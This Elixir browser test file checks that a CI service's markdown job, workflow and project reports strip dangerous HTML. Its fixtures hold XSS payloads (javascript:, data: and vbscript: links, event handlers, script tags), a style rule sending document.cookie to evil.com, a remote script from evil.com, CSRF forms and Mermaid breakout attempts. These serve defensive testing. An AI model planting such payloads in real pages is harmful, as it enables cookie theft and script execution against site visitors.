defmodule Front.Browser.ReportSecurityTest do
  use FrontWeb.WallabyCase

  alias Support.Stubs

  import Wallaby.Query, only: [css: 1, css: 2, link: 1, xpath: 1]

  describe "Markdown Report Security" do
    setup do
      user = Stubs.User.create_default()
      org = Stubs.Organization.create_default()
      Support.Stubs.Feature.enable_feature(org.id, :job_reports)
      Support.Stubs.Feature.enable_feature(org.id, :workflow_reports)
      Support.Stubs.PermissionPatrol.allow_everything(org.id, user.id)

      project = Stubs.Project.create(org, user)
      branch = Stubs.Branch.create(project)
      hook = Stubs.Hook.create(branch)
      workflow = Stubs.Workflow.create(hook, user)

      pipeline =
        Stubs.Pipeline.create_initial(workflow, name: "Build & Test", organization_id: org.id)

      block = Stubs.Block.create(pipeline)
      job = Stubs.Job.create(block)

      {:ok,
       %{
         user: user,
         org: org,
         project: project,
         workflow: workflow,
         pipeline: pipeline,
         job: job
       }}
    end

    test "XSS Prevention - javascript: protocol in links should be sanitized", %{
      session: session,
      job: job
    } do
      malicious_content = """
      # Test Report
      [Click me](javascript:alert('XSS'))
      <a href="javascript:alert('XSS')">Direct JS link</a>
      """

      Stubs.Artifact.create_job_report(job.id, malicious_content)

      session
      |> visit("/jobs/#{job.id}/reports")
      |> assert_no_js_protocol_links()
      |> refute_has(css("a[href^='javascript:']"))
    end

    test "XSS Prevention - data: URLs with scripts should be blocked", %{
      session: session,
      job: job
    } do
      malicious_content = """
      # Test Report
      <a href="data:text/html,<script>alert('XSS')</script>">Data URL XSS</a>
      [Data URL](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=)
      """

      Stubs.Artifact.create_job_report(job.id, malicious_content)

      session
      |> visit("/jobs/#{job.id}/reports")
      |> refute_has(css("a[href^='data:']"))
    end

    test "XSS Prevention - onclick and event handlers should be removed", %{
      session: session,
      job: job
    } do
      malicious_content = """
      # Test Report
      <a href="https://example.com" onclick="alert('XSS')">Link with onclick</a>
      <a href="https://safe.com" onmouseover="alert('XSS')">Link with onmouseover</a>
      <div onclick="alert('XSS')">Div with onclick</div>
      <img src="x" onerror="alert('XSS')">
      """

      Stubs.Artifact.create_job_report(job.id, malicious_content)

      session
      |> visit("/jobs/#{job.id}/reports")
      |> assert_no_event_handlers()
    end

    test "CSRF Prevention - form elements should be completely blocked", %{
      session: session,
      job: job
    } do
      malicious_content = """
      # Test Report
      <form action="/malicious" method="POST">
        <input type="text" name="csrf_token" value="stolen">
        <input type="submit" value="Submit">
      </form>
      """

      Stubs.Artifact.create_job_report(job.id, malicious_content)

      session
      |> visit("/jobs/#{job.id}/reports")
      |> refute_has(css("form"))
      |> refute_has(css("input"))
    end

    test "CSS Injection Prevention - style tags should be blocked", %{
      session: session,
      job: job
    } do
      malicious_content = """
      # Test Report
      <style>
        body { background: url('http://evil.com/steal?cookie=' + document.cookie); }
        #poc_form input[type=submit]{
          position:fixed;
          top:0;
          left:0;
          right:0;
          bottom:0;
        }
      </style>
      """

      Stubs.Artifact.create_job_report(job.id, malicious_content)

      session
      |> visit("/jobs/#{job.id}/reports")
      |> refute_has(css("style"))
    end

    test "Script Injection Prevention - script tags should be blocked", %{
      session: session,
      job: job
    } do
      malicious_content = """
      # Test Report
      <script>alert('XSS')</script>
      <script src="https://evil.com/malware.js"></script>
      """

      Stubs.Artifact.create_job_report(job.id, malicious_content)

      session
      |> visit("/jobs/#{job.id}/reports")
      |> refute_has(css("script"))
    end

    test "Dangerous Elements - iframe, embed, object should be blocked", %{
      session: session,
      job: job
    } do
      malicious_content = """
      # Test Report
      <iframe src="https://evil.com"></iframe>
      <embed src="https://evil.com/malware.swf">
      <object data="https://evil.com/malware.pdf"></object>
      """

      Stubs.Artifact.create_job_report(job.id, malicious_content)

      session
      |> visit("/jobs/#{job.id}/reports")
      |> refute_has(css("iframe"))
      |> refute_has(css("embed"))
      |> refute_has(css("object"))
    end

    test "VBScript Protocol - should be sanitized", %{
      session: session,
      job: job
    } do
      malicious_content = """
      # Test Report
      <a href="vbscript:alert('XSS')">VBScript XSS</a>
      """

      Stubs.Artifact.create_job_report(job.id, malicious_content)

      session
      |> visit("/jobs/#{job.id}/reports")
      |> refute_has(css("a[href^='vbscript:']"))
    end

    test "Safe Links - HTTPS links should be allowed and have security attributes", %{
      session: session,
      job: job
    } do
      safe_content = """
      # Test Report
      [GitHub](https://github.com)
      [Example](https://example.com)
      <a href="https://safe-site.com">Safe Link</a>
      """

      Stubs.Artifact.create_job_report(job.id, safe_content)

      page =
        session
        |> visit("/jobs/#{job.id}/reports")

      # Check that safe links are present
      assert_has(page, css("a[href='https://github.com']"))
      assert_has(page, css("a[href='https://example.com']"))
      assert_has(page, css("a[href='https://safe-site.com']"))

      # Check security attributes
      page
      |> assert_link_security_attributes()
    end

    test "Safe Links - mailto links should be allowed", %{
      session: session,
      job: job
    } do
      content = """
      # Test Report
      [Email Us](mailto:test@example.com)
      """

      Stubs.Artifact.create_job_report(job.id, content)

      session
      |> visit("/jobs/#{job.id}/reports")
      |> assert_has(css("a[href^='mailto:']"))
    end

    test "Mermaid Diagrams - should not allow HTML injection", %{
      session: session,
      job: job
    } do
      content = """
      # Test Report
      ```mermaid
      graph TD
          A[Start] --> B{Is it?}
          B -->|Yes| C[OK]
          B -->|No| D[End]
      ```
      """

      Stubs.Artifact.create_job_report(job.id, content)

      page =
        session
        |> visit("/jobs/#{job.id}/reports")

      # Mermaid diagrams should be rendered in sandboxed iframes
      assert_has(page, css(".mermaid"))

      # Ensure no script injection in mermaid content
      refute_mermaid_has_scripts(page)
    end

    test "Mermaid click directives - should allow clicks but sanitize javascript: URLs", %{
      session: session,
      job: job
    } do
      content = """
      # Test Report
      ```mermaid
      graph TD
          A[Clickable Node] --> B[Another Node]
          click A "javascript:alert('XSS')"
          click B "https://safe-site.com"
      ```
      """

      Stubs.Artifact.create_job_report(job.id, content)

      page =
        session
        |> visit("/jobs/#{job.id}/reports")

      # Check that mermaid rendered
      assert_has(page, css(".mermaid"))

      # Verify that javascript: URLs are sanitized in click handlers
      page
      |> execute_script("""
        const mermaidElements = document.querySelectorAll('.mermaid a, .mermaid [onclick]');
        for (let el of mermaidElements) {
          if (el.href && el.href.startsWith('javascript:')) return true;
          if (el.onclick && el.onclick.toString().includes('alert')) return true;
        }
        return false;
      """)
      |> then(fn result -> refute result, "JavaScript URLs should be sanitized in Mermaid click handlers" end)

      # But safe URLs should still work
      page
      |> execute_script("""
        const mermaidElements = document.querySelectorAll('.mermaid a');
        return Array.from(mermaidElements).some(el =>
          el.href && el.href.includes('safe-site.com')
        );
      """)
      |> then(fn result -> assert result, "Safe URLs in Mermaid click directives should be preserved" end)
    end

    test "Mermaid Diagrams - malformed syntax with script injection attempts", %{
      session: session,
      job: job
    } do
      malicious_content = """
      # Test Report
      ```mermaid
      </pre>
      <script>alert('XSS')</script>
      <form id=poc_form method=post action="/malicious">
        <input type=submit>
      </form>
      <pre>
      ```
      """

      Stubs.Artifact.create_job_report(job.id, malicious_content)

      session
      |> visit("/jobs/#{job.id}/reports")
      |> refute_has(css("script"))
      |> refute_has(css("form"))
    end

    test "Content Preservation - safe markdown should be rendered correctly", %{
      session: session,
      job: job
    } do
      safe_content = """
      # Main Title
      ## Subtitle
      **Bold text** and *italic text*
      - List item 1
      - List item 2

      | Column 1 | Column 2 |
      |----------|----------|
      | Data 1   | Data 2   |

      ```javascript
      const safe = "code block";
      ```

      <details>
      <summary>Click to expand</summary>
      This is hidden content
      </details>
      """

      Stubs.Artifact.create_job_report(job.id, safe_content)

      page =
        session
        |> visit("/jobs/#{job.id}/reports")

      # Check all safe elements are preserved
      assert_has(page, css("h1"))
      assert_has(page, css("h2"))
      assert_has(page, css("strong"))
      assert_has(page, css("em"))
      assert_has(page, css("ul"))
      assert_has(page, css("table"))
      assert_has(page, css("code"))
      assert_has(page, css("details"))
      assert_has(page, css("summary"))

      # Check content is preserved
      assert_text(page, "Main Title")
      assert_text(page, "Bold text")
      assert_text(page, "List item 1")
      assert_text(page, "Data 1")
    end

    test "Mixed Content - safe content preserved, unsafe removed", %{
      session: session,
      job: job
    } do
      mixed_content = """
      # Safe Title
      <script>alert('unsafe')</script>
      This is safe text
      <a href="javascript:void(0)">Unsafe link</a>
      [Safe link](https://example.com)
      <form>Unsafe form</form>
      **Safe bold text**
      """

      Stubs.Artifact.create_job_report(job.id, mixed_content)

      page =
        session
        |> visit("/jobs/#{job.id}/reports")

      # Safe content should be present
      assert_text(page, "Safe Title")
      assert_text(page, "This is safe text")
      assert_text(page, "Safe bold text")
      assert_has(page, css("h1"))
      assert_has(page, css("strong"))
      assert_has(page, css("a[href='https://example.com']"))

      # Unsafe content should be removed
      refute_has(page, css("script"))
      refute_has(page, css("form"))
      refute_has(page, css("a[href*='javascript']"))
    end

    test "Workflow Reports - same security rules apply", %{
      session: session,
      workflow: workflow
    } do
      malicious_content = """
      # Workflow Report
      <script>alert('XSS')</script>
      <form action="/evil" method="POST">
        <input type="submit">
      </form>
      <a href="javascript:alert('XSS')">Click</a>
      """

      Stubs.Artifact.create_workflow_report(workflow.id, malicious_content)

      session
      |> visit("/workflows/#{workflow.id}/reports")
      |> refute_has(css("script"))
      |> refute_has(css("form"))
      |> refute_has(css("input"))
      |> refute_has(css("a[href^='javascript:']"))
    end

    test "Project Reports - same security rules apply", %{
      session: session,
      project: project
    } do
      malicious_content = """
      # Project Report
      <style>body { background: red; }</style>
      <iframe src="https://evil.com"></iframe>
      <a href="data:text/html,<script>alert('XSS')</script>">Data URL</a>
      """

      Stubs.Artifact.create_project_report(project.id, malicious_content)

      session
      |> visit("/projects/#{project.name}/reports")
      |> refute_has(css("style"))
      |> refute_has(css("iframe"))
      |> refute_has(css("a[href^='data:']"))
    end
  end

  # Helper functions

  defp assert_no_js_protocol_links(session) do
    session
    |> execute_script("""
      return Array.from(document.querySelectorAll('a')).some(link =>
        link.href && link.href.startsWith('javascript:')
      );
    """)
    |> then(fn result -> refute result end)

    session
  end

  defp assert_no_event_handlers(session) do
    session
    |> execute_script("""
      const elements = document.querySelectorAll('*');
      for (let el of elements) {
        if (el.onclick || el.onmouseover || el.onerror || el.onload) {
          return true;
        }
      }
      return false;
    """)
    |> then(fn result -> refute result end)

    session
  end

  defp assert_link_security_attributes(session) do
    session
    |> execute_script("""
      const links = document.querySelectorAll('a[href^="https://"]');
      return Array.from(links).every(link =>
        link.target === '_blank' &&
        link.rel && link.rel.includes('noopener') && link.rel.includes('noreferrer')
      );
    """)
    |> then(fn result -> assert result end)

    session
  end

  defp refute_mermaid_has_scripts(session) do
    session
    |> execute_script("""
      const mermaidElements = document.querySelectorAll('.mermaid');
      for (let el of mermaidElements) {
        if (el.innerHTML.includes('<script') || el.innerHTML.includes('onclick')) {
          return true;
        }
      }
      return false;
    """)
    |> then(fn result -> refute result end)

    session
  end
end